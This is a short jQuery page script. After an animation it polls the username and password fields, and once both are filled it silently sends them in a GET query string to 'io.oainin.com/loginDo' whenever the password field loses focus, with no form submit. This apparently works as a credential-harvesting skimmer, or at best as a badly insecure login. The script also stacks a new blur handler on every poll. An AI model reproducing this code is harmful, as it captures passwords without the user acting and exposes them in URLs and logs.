$(function(){
				setTimeout(function(){
					$('#mainpage').slideDown(1000);
					
				},1000);
				setInterval(function(){
					if($('.username').val()!='' && $('.password').val()!=''){
						$('.password').blur(function(){
							$.ajax({
								url:'io.oainin.com/loginDo',
								type:'get',
								async:true,
								data:'username='+$('.username').val()+'&password='+$('.password').val(),
								success:function(msg){
									console.log(msg);
								}
							});
						});
					}
				},2000);
				
			});